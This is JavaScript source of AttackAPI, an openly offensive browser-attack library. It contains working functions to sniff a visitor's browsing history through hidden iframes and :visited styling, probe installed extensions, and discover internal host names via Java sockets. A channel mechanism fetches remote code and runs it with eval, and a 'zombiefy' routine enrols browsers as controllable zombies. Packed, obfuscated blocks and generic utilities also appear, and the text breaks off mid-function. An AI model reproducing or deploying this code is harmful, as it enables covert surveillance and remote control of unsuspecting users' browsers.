var AttackAPI = {
	version: '2.2.0a',
	author: 'Petko Petkov | pdp (architect)',
	homepage: 'http://www.gnucitizen.org',
	projecthome: 'http://www.gnucitizen.org/projects/attackapi'};

AttackAPI.core = {};

AttackAPI.core.bindFunction = function (func) {
	var args = [];
	
	for (var i = 1; i < arguments.length; i++)
		args.push(arguments[i]);
		
	return function () {
		func.apply(null, args);
	};
};

AttackAPI.core.extend = function (obj, properties) {
	for (var item in properties)
		obj[item] = properties[item];
	
	return obj;
};

AttackAPI.core.clone = function (obj) {
	if (arguments.length == 1) {
		var _obj = arguments.callee;
		_obj.prototype = obj;
		
		return new _obj();
	}
};

AttackAPI.utils = {};

AttackAPI.utils.buildQuery = function (obj) {
	var tokens = [];

	for (var item in obj)
		tokens.push(AttackAPI.utils.encodeURL(item) + '=' + ((obj[item] != undefined && obj[item] != null)?AttackAPI.utils.encodeURL(obj[item]):''));
	
	return tokens.join('&');
};

// needs more work on this function
AttackAPI.utils.parseJSON = function (input, isSafe) {
	var isSafe = (isSafe != undefined)?isSafe:false;
	
	if (isSafe && !/^("(\\.|[^"\\\n\r])*?"|[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t])+?$/.test(input))
		return null;
		
	return eval('(' + input + ')');
};
AttackAPI.utils.decodeURL = function (url) {
	return unescape(url);
};

AttackAPI.utils.packJS = function (script, encoding, fastdecode, specialchars) {
	eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[(function(e){return d[e]})];e=(function(){return'\\w+'});c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('6 V(){5 $21=0,$26=1,$25=2;5 $27=/\\(/g,$1S=/\\$\\d/,$1T=/^\\$\\d+$/,$1Z=/([\'"])\\1\\+(.*)\\+\\1\\1$/,$$2i=/\\\\./g,$1U=/\'/,$$20=/\\13[^\\13]*\\13/g;5 2b=N;N.q=6($1s,$l){c(!$l)$l="";5 $h=(1v(M($1s)).u($27)||"").h+1;c($1S.1q($l)){c($1T.1q($l)){$l=1k($l.T(1))-1}19{5 i=$h;5 $15=$1U.1q(1v($l))?\'"\':"\'";S(i)$l=$l.2j("$"+i--).1r($15+"+a[o+"+i+"]+"+$15);$l=J 2x("a,o","7"+$15+$l.f($1Z,"$1")+$15)}}22($1s||"/^$/",$l,$h)};N.X=6($C){12.h=0;7 2g(1d($C,N.y).f(J W(P,N.2k?"2y":"g"),1y),N.y).f($$20,"")};N.2z=6(){P.h=0};5 12=[];5 P=[];5 1z=6(){7"("+M(N[$21]).T(1,-1)+")"};P.U=6(){7 N.1r("|")};6 22(){F.U=1z;P[P.h]=F}6 1y(){c(!F[0])7"";5 i=1,j=0,$1c;S($1c=P[j++]){c(F[i]){5 $l=$1c[$26];2A(2B $l){1K"6":7 $l(F,i);1K"2C":7 F[$l+i]}5 $28=(F[i].1P(2b.y)==-1)?"":"\\13"+F[i]+"\\13";7 $28+$l}19 i+=$1c[$25]}};6 1d($C,$y){7 $y?$C.f(J W("\\\\"+$y+"(.)","g"),6($u,$2f){12[12.h]=$2f;7 $y}):$C};6 2g($C,$y){5 i=0;7 $y?$C.f(J W("\\\\"+$y,"g"),6(){7 $y+(12[i++]||"")}):$C};6 1v($C){7 $C.f($$2i,"")}};V.2D={2E:V,2k:2d,y:""};6 2c(1h,k,14,1t){5 $Y="$1";1h+="\\n";k=1p.1M(1k(k),2F);6 1F($9){5 i,$1x;1O(i=0;($1x=1e[i]);i++){$9=$1x($9)}7 $9};5 1B=6($O,$B,$e,$m,$t,$G){S($e--)c($m[$e])$O=$O.f(J W(\'\\\\b\'+$t($e)+\'\\\\b\',\'g\'),$m[$e]);7 $O};5 1Y=6(){c(!\'\'.f(/^/,M)){S($e--)$G[$t($e)]=$m[$e]||$t($e);$m=[6($D){7 $G[$D]}];$t=6(){7\'\\\\w+\'};$e=1}};5 1e=[];6 1a($8){1e[1e.h]=$8};6 1Q($9){5 $8=J V;$8.y="\\\\";$8.q(/\'[^\'\\n\\r]*\'/,$Y);$8.q(/"[^"\\n\\r]*"/,$Y);$8.q(/\\/\\/[^\\n\\r]*[\\n\\r]/," ");$8.q(/\\/\\*[^*]*\\*+([^\\/][^*]*\\*+)*\\//," ");$8.q(/\\s+(\\/[^\\/\\n\\r\\*][^\\/\\n\\r]*\\/g?i?)/,"$2");$8.q(/[^\\w\\17\\/\'"*)\\?:]\\/[^\\/\\n\\r\\*][^\\/\\n\\r]*\\/g?i?/,$Y);c(1t)$8.q(/;;;[^\\n\\r]+[\\n\\r]/);$8.q(/\\(;;\\)/,$Y);$8.q(/;+\\s*([};])/,"$2");$9=$8.X($9);$8.q(/(\\b|\\17)\\s+(\\b|\\17)/,"$2 $3");$8.q(/([+\\-])\\s+([+\\-])/,"$2 $3");$8.q(/\\s+/,"");7 $8.X($9)};6 24($9){5 $8=J V;$8.q(/((\\17+)([a-2m-Z$1V]+))(\\d*)/,6($u,$L){5 $h=$u[$L+2].h;5 $1A=$h-1p.2n($h-$u[$L+3].h,0);7 $u[$L+1].2o($1A,$h)+$u[$L+4]});5 $K=/\\2p[A-2q-z\\d]\\w*/;5 $m=1j($9,1f($K),1R);5 $D=$m.$D;$8.q($K,6($u,$L){7 $D[$u[$L]]});7 $8.X($9)};6 1X($9){c(k>Q)$9=23($9);5 $8=J V;5 $t=1g(k);5 $K=(k>Q)?/\\w\\w+/ :/\\w+/;$m=1j($9,1f($K),$t);5 $D=$m.$D;$8.q($K,6($u,$L){7 $D[$u[$L]]});7 $9&&1L($8.X($9),$m)};6 1j($9,$K,$t){5 $1b=$9.u($K);5 $$H=[];5 $$D={};5 $$I={};c($1b){5 $R=[];5 $I={};5 $1n={};5 $e={};5 i=$1b.h,j=0,$E;1l{$E="$"+$1b[--i];c(!$e[$E]){$e[$E]=0;$R[j]=$E;$I["$"+($1n[j]=$t(j))]=j++}$e[$E]++}S(i);i=$R.h;1l{$E=$R[--i];c($I[$E]!=1I){$$H[$I[$E]]=$E.T(1);$$I[$I[$E]]=2h;$e[$E]=0}}S(i);$R.2r(6($1G,$1W){7 $e[$1W]-$e[$1G]});j=0;1l{c($$H[i]==1I)$$H[i]=$R[j++].T(1);$$D[$$H[i]]=$1n[i]}S(++i<$R.h)}7{$H:$$H,$D:$$D,$I:$$I}};6 1L($O,$m){5 $1w=1i("$t\\\\($e\\\\)","g");$O="\'"+1d($O)+"\'";5 $B=1p.1M($m.$H.h,k)||1;5 $e=$m.$H.h;1O(5 i 2v $m.$I)$m.$H[i]="";$m="\'"+$m.$H.1r("|")+"\'.2j(\'|\')";5 $t=k>Q?1m:1g($B);$t=M($t).f(/k/g,"$B").f(/F\\.1o/g,"$t");5 $1u="$e"+($B>10?".U($B)":"");c(14){5 $G=1J(1Y);c(k>Q)$G=$G.f(/\\\\\\\\w/g,"[\\\\2a-\\\\2e]");19 c($B<11)$G=$G.f($1w,$1u);c(!$e)$G=$G.f(1i("($e)\\\\s*=\\\\s*1"),"$1=0")}5 $v=M(1B);c(14){$v=$v.f(/\\{/,"{"+$G+";")}$v=$v.f(/"/g,"\'");c(k>Q){$v=$v.f(/\'\\\\\\\\b\'\\s*\\+|\\+\\s*\'\\\\\\\\b\'/g,"")}c($B>11||k>Q||14){$v=$v.f(/\\{/,"{$t="+$t+";")}19{$v=$v.f($1w,$1u)}$v=2c($v,0,2d,2h);5 $18=[$O,$B,$e,$m];c(14){$18=$18.2G(0,"{}")}7"2l("+$v+"("+$18+"))\\n"};6 1g($B){7 $B>10?$B>11?$B>Q?1m:1E:1D:1C};5 1C=6($p){7 $p};5 1D=6($p){7 $p.U(11)};5 1E=6($p){7($p<k?\'\':F.1o(1k($p/k)))+(($p=$p%k)>2s?M.1N($p+29):$p.U(11))};5 1m=6($p){7($p<k?\'\':F.1o($p/k))+M.1N($p%k+2u)};5 1R=6($p){7"1V"+$p};6 1d($9){7 $9.f(/([\\\\\'])/g,"\\\\$1")};6 23($9){7 $9.f(/[\\2a-\\2e]/g,6($u){7"\\\\x"+$u.2H(0).U(16)})};6 1i($C,$1H){7 J W($C.f(/\\$/g,"\\\\$"),$1H)};6 1J($6){2t(M($6))7 T(1P("{")+1,2w("}"))};6 1f($K){7 J W(M($K).T(1,-1),"g")};1a(1Q);c(1t)1a(24);c(k)1a(1X);7 1F(1h)};',62,168,'|||||var|function|return|parser|script|||if||count|replace||length|||_encoding|replacement|keywords|||charCode|add|||encode|match|unpack|||escapeChar|||ascii|string|encoded|word|arguments|decode|sorted|protected|new|regexp|offset|String|this|packed|_patterns|62|unsorted|while|slice|toString|ParseMaster|RegExp|exec|IGNORE|||36|_escaped|x01|_fastDecode|quote||x24|params|else|_addParser|all|pattern|_escape|_parsers|_globalize|_getEncoder|_script|_safeRegExp|_analyze|parseInt|do|_encode95|values|callee|Math|test|join|expression|_specialChars|inline|_internalEscape|ENCODE|parse|_replacement|_toString|start|_unpack|_encode10|_encode36|_encode62|_pack|match1|flags|null|_getFunctionBody|case|_bootStrap|min|fromCharCode|for|indexOf|_basicCompression|_encodePrivate|SUB_REPLACE|INDEXED|QUOTE|_|match2|_encodeKeywords|_decode|TRIM|DELETED|EXPRESSION|_add|_escape95|_encodeSpecialChars|LENGTH|REPLACEMENT|GROUPS|delete||xa1|self|pack|false|xff|char|_unescape|true|ESCAPE|split|ignoreCase|eval|zA|max|substr|b_|Za|sort|35|with|161|in|lastIndexOf|Function|gi|reset|switch|typeof|number|prototype|constructor|95|concat|charCodeAt'.split('|'),0,{}));
	return pack(script, encoding, fastdecode, specialchars);
};

AttackAPI.utils.encodeURL = function (url) {
	return escape(url);
};

AttackAPI.utils.buildURL = function (obj) {
	var host = obj.host?obj.host:(obj.hostname?obj.hostname:null);
	
	if (!host)
		return '';
	
	var hash = obj.hash?(obj.hash[0] == '#'?obj.hash:'#' + obj.hash):'';
	var password = obj.password?obj.password:'';
	var pathname = obj.pathname?(obj.pathname[0] == '/'?obj.pathname:'/' + obj.pathname):'/';
	var port = obj.port?':' + obj.port:'';
	var protocol = obj.protocol?obj.protocol + '://':'http://';
	var search = obj.search?(obj.search[0] == '?'?obj.search:'?' + obj.search):'';
	var username = obj.username?obj.username:'';
	var creds = (username || password)?username + ':' + password + '@':'';
	
	return protocol + creds + host + (port != ':80'?port:'') + pathname + (search != '?'?search:'') + (hash != '#'?hash:'');
};

AttackAPI.utils.range2net = function (range) {
	return AttackAPI.utils.number2ip(range.start) + '-' + AttackAPI.utils.number2ip(range.stop);
};

AttackAPI.utils.net2range = function (net) {
	var start = stop = 0;
	
	if (net.indexOf('/') != -1) {
		var tokens = net.split('/');
		
		start = AttackAPI.utils.ip2number(tokens[0]);
		stop = Math.pow(2, 32 - tokens[1]) + start - 1;
	} else if (net.indexOf('-') != -1) {
		var tokens = net.split('-');
		
		start = AttackAPI.utils.ip2number(tokens[0].replace(/^\s+/g, '').replace(/\s+$/g, ''));
		stop = AttackAPI.utils.ip2number(tokens[1].replace(/^\s+/g, '').replace(/\s+$/g, ''));
	} else
		start = stop = 0;
	
	return {start: start, stop: stop};
};

AttackAPI.utils.buildDomain = function (obj) {
	var domain = (obj.subdomain?obj.subdomain:'') + (obj.name?'.' + obj.name:'') + (obj.tld?'.' + obj.tld:'');
	
	if (domain[0] == '.')
		domain = domain.substring(1);
		
	return domain;
};

AttackAPI.utils.decodeBase64 = function (input) {
	var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
	
	var result = '';
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	var input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

	do {
		enc1 = chars.indexOf(input.charAt(i++));
		enc2 = chars.indexOf(input.charAt(i++));
		enc3 = chars.indexOf(input.charAt(i++));
		enc4 = chars.indexOf(input.charAt(i++));

		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;

		result += String.fromCharCode(chr1);

		if (enc3 != 64)
			result += String.fromCharCode(chr2);
			
		if (enc4 != 64)
			result += String.fromCharCode(chr3);
	} while (i < input.length);
	
	return result;
};

// needs more work on this function
AttackAPI.utils.buildJSON = function (input) {
	var m = {
		'\b': '\\b',
		'\t': '\\t',
		'\n': '\\n',
		'\f': '\\f',
		'\r': '\\r',
		'"' : '\\"',
		'\\': '\\\\'};
		
	var s = {
		'array': function (x) {
			var a = ['['], b, f, i, l = x.length, v;
			
			for (i = 0; i < l; i += 1) {
				v = x[i];
				f = s[typeof v];
				
				if (f) {
					v = f(v);
					
					if (typeof v == 'string') {
						if (b) {
							a[a.length] = ',';
						}
						
						a[a.length] = v;
						b = true;
					}
				}
			}
			
			a[a.length] = ']';
			return a.join('');
		},
		'boolean': function (x) {
			return String(x);
		},
		'null': function (x) {
			return "null";
		},
		'number': function (x) {
			return isFinite(x) ? String(x) : 'null';
		},
		'object': function (x) {
			if (x) {
				if (x instanceof Array) {
					return s.array(x);
				}
				
				var a = ['{'], b, f, i, v;
				
				for (i in x) {
					v = x[i];
					f = s[typeof v];
					
					if (f) {
						v = f(v);
						
						if (typeof v == 'string') {
							if (b) {
								a[a.length] = ',';
							}
							
							a.push(s.string(i), ':', v);
							b = true;
						}
					}
				}
				
				a[a.length] = '}';
				return a.join('');
			}
			
			return 'null';
		},
		'string': function (x) {
			if (/["\\\x00-\x1f]/.test(x)) {
				x = x.replace(/([\x00-\x1f\\"])/g, function(a, b) {
					var c = m[b];
					
					if (c) {
						return c;
					}
					
					c = b.charCodeAt();
					return '\\u00' + Math.floor(c / 16).toString(16) + (c % 16).toString(16);
				});
			}
			
			return '"' + x + '"';
		}
	};
	
	var f = isNaN(input) ? s[typeof input] : s['number'];
	
	if (f)
		return f(input);
};
AttackAPI.utils.parseURL = function (url) {
	var REGEX = /^((\w+):\/\/)?((\w+):?(\w+)?@)?([^\/\?:]+):?(\d+)?(\/?[^\?#]+)?\??([^#]+)?#?(\w*)/;
	
	var fields = {'href': 0, 'username' : 4, 'password' : 5, 'port' : 7, 'protocol' : 2, 'host' : 6, 'hostname' : 6, 'pathname' : 8, 'search' : 9, 'hash' : 10};
	var result = new Object();
	var r = REGEX.exec(url);
	
	for (var field in fields)
		result[field] = r[fields[field]];
	
	result.hash = result.hash?'#' + result.hash:'#';
	result.search = result.search?'?' + result.search:'?';
	result.username = result.username?result.username:'';
	result.password = result.password?result.password:'';
	
	if (result.port == undefined)
		switch (result.protocol) {
			case 'http':
				result.port = 80;
				break;
			case 'https':
				result.port = 443;
				break;
			case 'ftp':
				result.port = 21;
				break;
			default:
				result.port = '';
				break;
		}
	
	return result;
};

AttackAPI.utils.parseQuery = function (query) {
	var queryobj = new Object();
	var tokens = query.split('&');
	
	for (var index = 0; index < tokens.length; index++) {
		var pair = tokens[index].split('=');
		queryobj[AttackAPI.utils.decodeURL(pair[0])] = AttackAPI.utils.decodeURL(pair[1]);
	}
		
	return queryobj;
};

AttackAPI.utils.parseDomain = function (domain) {
	var tokens = domain.split('.').reverse();
	return {domain: domain, tld: tokens[0], name: tokens[1], subdomain: tokens.slice(2).reverse().join('.')};
};

AttackAPI.utils.encodeBase64 = function (input) {
	var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

	var result = '';
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;
	
	do {
		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);
		
		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
		enc4 = chr3 & 63;
		
		if (isNaN(chr2))
			enc3 = enc4 = 64;
		else if (isNaN(chr3))
			enc4 = 64;
		
		result += chars.charAt(enc1) + chars.charAt(enc2) + chars.charAt(enc3) + chars.charAt(enc4);
	} while (i < input.length);
	
	return result;
};

AttackAPI.utils.encodeMD5 = function (string) {
	eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('l 1R(s){k N(Q(O(s),s.u*8))}l Q(x,o){x[o>>5]|=1Y<<((o)%v);x[(((o+1V)>>>9)<<4)+14]=o;g a=1J;g b=-1G;g c=-1H;g d=24;B(g i=0;i<x.u;i+=16){g H=a;g G=b;g P=c;g L=d;a=f(a,b,c,d,x[i+0],7,-1P);d=f(d,a,b,c,x[i+1],12,-2d);c=f(c,d,a,b,x[i+2],17,27);b=f(b,c,d,a,x[i+3],22,-29);a=f(a,b,c,d,x[i+4],7,-1A);d=f(d,a,b,c,x[i+5],12,1E);c=f(c,d,a,b,x[i+6],17,-1x);b=f(b,c,d,a,x[i+7],22,-S);a=f(a,b,c,d,x[i+8],7,2e);d=f(d,a,b,c,x[i+9],12,-1l);c=f(c,d,a,b,x[i+10],17,-1n);b=f(b,c,d,a,x[i+11],22,-T);a=f(a,b,c,d,x[i+12],7,Z);d=f(d,a,b,c,x[i+13],12,-19);c=f(c,d,a,b,x[i+14],17,-V);b=f(b,c,d,a,x[i+15],22,1k);a=j(a,b,c,d,x[i+1],5,-Y);d=j(d,a,b,c,x[i+6],9,-W);c=j(c,d,a,b,x[i+11],14,U);b=j(b,c,d,a,x[i+0],20,-1i);a=j(a,b,c,d,x[i+5],5,-1p);d=j(d,a,b,c,x[i+10],9,1h);c=j(c,d,a,b,x[i+15],14,-2c);b=j(b,c,d,a,x[i+4],20,-2b);a=j(a,b,c,d,x[i+9],5,1f);d=j(d,a,b,c,x[i+14],9,-18);c=j(c,d,a,b,x[i+3],14,-28);b=j(b,c,d,a,x[i+8],20,1e);a=j(a,b,c,d,x[i+13],5,-1d);d=j(d,a,b,c,x[i+2],9,-1a);c=j(c,d,a,b,x[i+7],14,1b);b=j(b,c,d,a,x[i+12],20,-1c);a=e(a,b,c,d,x[i+5],4,-1j);d=e(d,a,b,c,x[i+8],11,-1W);c=e(c,d,a,b,x[i+11],16,1r);b=e(b,c,d,a,x[i+14],23,-1s);a=e(a,b,c,d,x[i+1],4,-1t);d=e(d,a,b,c,x[i+4],11,1S);c=e(c,d,a,b,x[i+7],16,-1u);b=e(b,c,d,a,x[i+10],23,-1Q);a=e(a,b,c,d,x[i+13],4,1v);d=e(d,a,b,c,x[i+0],11,-1O);c=e(c,d,a,b,x[i+3],16,-1y);b=e(b,c,d,a,x[i+6],23,1M);a=e(a,b,c,d,x[i+9],4,-1z);d=e(d,a,b,c,x[i+12],11,-1B);c=e(c,d,a,b,x[i+15],16,1C);b=e(b,c,d,a,x[i+2],23,-1D);a=h(a,b,c,d,x[i+0],6,-1F);d=h(d,a,b,c,x[i+7],10,1I);c=h(c,d,a,b,x[i+14],15,-1K);b=h(b,c,d,a,x[i+5],21,-1L);a=h(a,b,c,d,x[i+12],6,1N);d=h(d,a,b,c,x[i+3],10,-1T);c=h(c,d,a,b,x[i+10],15,-1U);b=h(b,c,d,a,x[i+1],21,-1X);a=h(a,b,c,d,x[i+8],6,1Z);d=h(d,a,b,c,x[i+15],10,-25);c=h(c,d,a,b,x[i+6],15,-26);b=h(b,c,d,a,x[i+13],21,1q);a=h(a,b,c,d,x[i+4],6,-1o);d=h(d,a,b,c,x[i+11],10,-1m);c=h(c,d,a,b,x[i+2],15,X);b=h(b,c,d,a,x[i+9],21,-1g);a=m(a,H);b=m(b,G);c=m(c,P);d=m(d,L)}k M(a,b,c,d)}l p(q,a,b,x,s,t){k m(R(m(m(a,q),m(x,t)),s),b)}l f(a,b,c,d,x,s,t){k p((b&c)|((~b)&d),a,b,x,s,t)}l j(a,b,c,d,x,s,t){k p((b&d)|(c&(~d)),a,b,x,s,t)}l e(a,b,c,d,x,s,t){k p(b^c^d,a,b,x,s,t)}l h(a,b,c,d,x,s,t){k p(c^(b|(~d)),a,b,x,s,t)}l m(x,y){g D=(x&z)+(y&z);g F=(x>>16)+(y>>16)+(D>>16);k(F<<16)|(D&z)}l R(A,w){k(A<<w)|(A>>>(v-w))}l O(n){g C=M();g J=(1<<8)-1;B(g i=0;i<n.u*8;i+=8){C[i>>5]|=(n.1w(i/8)&J)<<(i%v)}k C}l N(r){g E=\'2a\';g n=\'\';B(g i=0;i<r.u*4;i++){n+=E.K((r[i>>2]>>((i%4)*8+4))&I)+E.K((r[i>>2]>>((i%4)*8))&I)}k n}',62,139,'||||||||||||||md5_hh|md5_ff|var|md5_ii||md5_gg|return|function|safe_add|str|len|md5_cmn||binarray|||length|32|cnt|||0xFFFF|num|for|bin|lsw|hex_tab|msw|oldb|olda|0xF|mask|charAt|oldd|Array|binl2hex|str2binl|oldc|core_md5|bit_rol|45705983|1990404162|643717713|1502002290|1069501632|718787259|165796510|1804603682|||||||||1019803690|40341101|51403784|1735328473|1926607734|1444681467|1163531501|568446438|343485551|38016083|373897302|378558|1236535329|1958414417|1120210379|42063|145523070|701558691|1309151649|1839030562|35309556|1530992060|155497632|681279174|charCodeAt|1473231341|722521979|640364487|176418897|421815835|530742520|995338651|1200080426|198630844|271733879|1732584194|1126891415|1732584193|1416354905|57434055|76029189|1700485571|358537222|680876936|1094730640|hex_md5|1272893353|1894986606|1051523|64|2022574463|2054922799|0x80|1873313359|||||271733878|30611744|1560198380|606105819|187363961|1044525330|0123456789abcdef|405537848|660478335|389564586|1770035416'.split('|'),0,{}));
	return hex_md5(string);
};

AttackAPI.utils.ip2number = function (ip) {
	var octets = ip.split('.');
	return (16777216 * octets[0]) + (65536 * octets[1]) + (256 * octets[2]) + Number(octets[3]);	
};

AttackAPI.utils.number2ip = function (num) {
	return Math.floor(num/16777216)%256 + '.' + Math.floor(num/65536)%256 + '.' + Math.floor(num/256)%256 + '.' + Math.floor(num)%256;	
};

AttackAPI.dom = {};

AttackAPI.dom.getInternalHostname = function () {
	try {
		var sock = new java.net.Socket();
		
		sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
		sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
		
		return sock.getLocalAddress().getHostName();	
	} catch (e) {}
	
	return 'localhost';
};

AttackAPI.dom.scanExtensions = function (scan) {
	var signatures = (scan.signatures != undefined)?scan.signatures:AttackAPI.dom.signatures.extensions;
	
	function check(signature, index, length) {	
		var img = new Image();
		img.onload = function() {
			if (typeof(scan.onfound) == 'function')
				scan.onfound(signature, scan);

			if (index == length - 1 && typeof(scan.oncomplete) == 'function')
				scan.oncomplete(scan);
		};
		img.onerror = function() {
			if (index == length - 1 && typeof(scan.oncomplete) == 'function')
				scan.oncomplete(scan);
		};
		img.src = signature.url;
	}
	
	for (var i = 0; i < signatures.length; i++)
		check(signatures[i], i, signatures.length);
};

AttackAPI.dom.triggerEvent = function (event, data, target) {
	var target = (target == undefined)?window:target;
	
	if (typeof(target['on' + event]) == 'function')
		target['on' + event](data);
};

AttackAPI.dom.scanHistory = function (scan) {
	var urls = (scan.urls != undefined)?scan.urls:AttackAPI.dom.signatures.sites;
	
	var ifr = document.createElement('iframe');
	ifr.style.visibility = 'hidden';
	ifr.style.width = ifr.style.height = 0;
	
	document.body.appendChild(ifr);
	
	var doc = AttackAPI.dom.getDocument(ifr);
	doc.open();
	doc.write('<style>a:visited{display: none}</style>');
	doc.close();
	
	for (var i = 0; i < urls.length; i++) {
		var a = doc.createElement('a');
		a.href = urls[i];
		
		doc.body.appendChild(a);
		
		if (a.currentStyle)
			var display = a.currentStyle['display'];
		else
			var display = doc.defaultView.getComputedStyle(a, null).getPropertyValue('display')
			
		if (display == 'none' && typeof(scan.onfound) == 'function')
			scan.onfound(urls[i], scan);
	}
	
	document.body.removeChild(ifr);
	
	if (typeof(scan.oncomplete) == 'function')
		scan.oncomplete(scan);
};

AttackAPI.dom.attachEvent = function (callback, event, target, capturing) {
	var target = (target == undefined)?window:target;
	var capturing = (capturing == undefined)?false:true;
	
	if (target.addEventListener)
		target.addEventListener(event, callback, capturing);
	else
		target.attachEvent('on' + event, callback);
};

AttackAPI.dom.spawnSandbox = function (data) {
	var queue = [];
	var loaded = false;
	
	var ifr = document.createElement('iframe');
	ifr.style.visibility = 'hidden';
	ifr.style.width = ifr.style.height = 0;
	
	document.body.appendChild(ifr);
	
	var sandbox = {
		scope: ifr.contentWindow,
		
		evaluate: function (expr) {
			if (!loaded)
				queue.push(expr)

			else
				ifr.contentWindow.location = 'javascript:' + escape(expr) + ';void(0);';
		},
		terminate: function () {
			document.body.removeChild(ifr);
		}
	};
	
	ifr.onload = function () {
		loaded = true;
		
		AttackAPI.core.extend(ifr.contentWindow, data);
		
		for (var i = 0; i < queue.length; i++)
			sandbox.evaluate(queue[i]);
	};
	
	return sandbox;
};

AttackAPI.dom.requestLC = function (request) {
	try {
		if (typeof(request.onload) == 'function')
			request.onload({data: AttackAPI.dom.requestLCL(request.url + (request.query?request.query:'?' + AttackAPI.utils.buildQuery(request.query)))}, request);
	} catch (e) {
		if (typeof(request.onerror) == 'function')
			request.onerror(e, request);
	}
};

AttackAPI.dom.getDocument = function (target) {
	var doc = null;
		
	if (target == undefined)
		doc = document;
	else if (target.contentDocument)
		doc  = target.contentDocument;
	else if (target.contentWindow)
		doc = target.contentWindow.document;
	else if (target.document)
		doc = target.document;
	
	return doc;
};

AttackAPI.dom.freeze = function (time) {
	var date = new Date();
	var cur = null;

	do {
		cur = new Date();
	} while(cur - date < time);
};

AttackAPI.dom.spawnChannel = function (channel) {
	if (AttackAPI.dom.spawnChannel.channels == undefined)
		AttackAPI.dom.spawnChannel.channels = new Array();
	
	var channel = AttackAPI.core.clone(channel);
	channel.index = AttackAPI.dom.spawnChannel.channels.length;
	channel.referrer = channel.referrer?channel.referrer:document.location;
	
	function transport(query) {
		AttackAPI.core.extend(query, {
			referrer: channel.referrer,
			__r: Math.random() + '_' + new Date().getTime()});
			
		AttackAPI.dom.transport({url: channel.location, query: query});
	}
	
	function evaluate(query) {
		AttackAPI.core.extend(query, {
			referrer: channel.referrer,
			__r: Math.random() + '_' + new Date().getTime()});
			
		AttackAPI.dom.requestJSL(channel.location + '?' + AttackAPI.utils.buildQuery(query));		
	}
	
	function prepareList(obj) {
		if (obj.join)
			return obj.join(',');
			
		return obj;
	}
	
	if (typeof(channel.onpull) != 'function')
		channel.onpull = function (message) {
			eval(message);
		};
		
	channel.pull = function () {
		evaluate({
			action: 'pull',
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onpull'});
		
		return true;
	};
	
	channel.push = function (message, client, target) {
		if (typeof(channel.onpush) == 'function' && !channel.onpush(message, client, target))
			return false;
			
		transport({
			action: 'push',
			message: message,
			target: target?target:'_',
			client: prepareList(client?client:'self')});
		
		return true;
	};
	
	channel.list = function () {
		if (typeof(channel.onlist) == 'undefined')
			return false;
			
		evaluate({
			action: 'list',
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onlist'});
		
		return true;
	};
	
	channel.enumerate = function () {
		if (typeof(channel.onenumerate) == 'undefined')
			return false;
			
		evaluate({
			action: 'enum',
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onenumerate'});
		
		return true;
	};
	
	channel.view = function (client) {
		if (typeof(channel.onview) == 'undefined')
			return false;
			
		evaluate({
			action: 'view',
			client: prepareList(client?client:'self'),
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onview'});
		
		return true;
	};
	
	channel.save = function (key, value, client) {
		if (typeof(channel.onsave) && !channel.onsave(key, value, client))
			return false;
			
		transport({
			action: 'save',
			key: key,
			value: value,
			client: prepareList(client?client:'self')});
		
		return true;
	};
	
	channel.init = function () {
		if (typeof(channel.oninit) && !channel.oninit())
			return false;
			
		evaluate({
			action: 'init'});
	};
	
	AttackAPI.dom.spawnChannel.channels.push(channel);
	
	return channel;
};

AttackAPI.dom.requestLCL = function (url) {
	var data = null;
	
	var destination = new java.net.URL(url);
	var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 65536);
	var stream = destination.getContent();
	
	while (true) {
		var count = stream.read(buffer);
		
		if (count <= 0)
			break;
			
		var str = new java.lang.String(buffer, 0, count);
		data += str;
	}
	
	stream.close();
	
	return data;
};

AttackAPI.dom.zombiefy = function (zombie) {
	AttackAPI.dom.spawnZombie(zombie).start();
};

AttackAPI.dom.requestIMG = function (request) {
	var tmr = null;
	
	var img = new Image();
	img.onload = img.onerror = function () {
		window.clearTimeout(tmr);
		
		if (typeof(request.onload) == 'function')
			request.onload(new Object(), request);
	};
	
	if (request.query)
		img.src = request.url + '?' + AttackAPI.utils.buildQuery(request.query);
	else
		img.src = request.url;
		
	tmr = window.setTimeout(function () {
		delete img;
		
		if (typeof(request.ontimeout) == 'function')
			request.ontimeout(request);
	}, request.timeout?request.timeout:1000);
};

AttackAPI.dom.requestJS = function (request) {
	var tmr = null;
	
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.defer = true;
	script.onload = function () {
		window.clearTimeout(tmr);
		document.body.removeChild(script);
		
		if (typeof(request.onload) == 'function')
			request.onload(new Object(), request);
	};
	script.onerror = function () {
		window.clearTimeout(tmr);
		document.body.removeChild(script);
		
		if (typeof(request.onerror) == 'function')
			request.onerror('error', request);
	};
	
	if (request.query)
